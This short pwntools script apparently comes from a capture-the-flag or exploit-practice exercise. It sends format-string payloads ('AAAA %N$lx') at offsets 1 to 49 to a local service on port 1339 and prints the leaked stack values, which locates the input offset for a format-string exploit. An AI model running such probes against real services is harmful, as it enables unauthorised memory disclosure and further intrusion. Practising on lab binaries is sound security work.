from pwn import *

e = ELF("./dist.o")
#context.log_level = 'DEBUG' 
for i in range(1,50):
        #io = e.process(level="error")
        io = remote("127.0.0.1",1339,level="error")
        io.sendline("AAAA %%%d$lx" % i)
        io.recvline()
        io.recvuntil("Meh\n")
        print("%d - %s" % (i, io.recvline().strip()))
        io.close()
